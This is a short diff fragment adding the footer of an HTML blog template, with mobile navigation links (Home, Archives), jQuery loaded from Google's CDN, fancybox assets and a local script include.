+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
